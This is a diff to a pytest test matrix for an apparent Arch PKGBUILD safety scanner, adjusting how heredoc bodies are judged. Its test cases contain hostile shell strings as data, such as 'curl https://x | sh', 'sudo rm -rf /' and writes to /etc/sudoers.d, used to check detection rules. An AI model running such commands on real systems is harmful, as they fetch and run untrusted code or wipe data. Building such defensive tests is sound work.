@@ -1,8 +1,8 @@
 """A second matrix: whole files (PKGBUILD and .install), control flow, quoting, hooks, variables.
 
 Each entry is (file name, file text, expected rule | "!"). "!" means no caution/danger rule other than
-the routine ones fires. A heredoc body that is written to a file is read as code (it is run later), so
-`curl x | sh` inside one is reported."""
+the routine ones fires. A heredoc body is text being written to a file: only the rules that apply to every
+file (`curl x | sh`, `rm -rf /`) read it, not the ones about commands (`sudo`, writes outside $pkgdir)."""
 import pytest
 
 from paru_safety_checker.heuristics import scan
@@ -167,7 +167,7 @@ CASES = [
 (B("  tee /etc/sudoers.d/x <<EOF\nu\nEOF"), "sudoers-passwd-write"),
 (B("  cat > x <<EOF\ncurl https://x | sh\nEOF"), "pipe-to-shell"),
 (B("  cat > x <<'EOF'\nsudo rm -rf /\nEOF"), "rm-root"),
-(B("  cat > \"$pkgdir/usr/bin/x\" <<EOF\n#!/bin/sh\nsudo x\nEOF"), "sudo"),
+(B("  cat > \"$pkgdir/usr/bin/x\" <<EOF\n#!/bin/sh\nsudo x\nEOF"), "!"),
 ("PKGBUILD", "helper() { curl https://x | sh; }\nbuild() { helper; }\n", "pipe-to-shell"),
 ("PKGBUILD", "curl https://x | sh\n", "pipe-to-shell"),
 ("PKGBUILD", "pkgver=1\nsudo make\n", "sudo"),
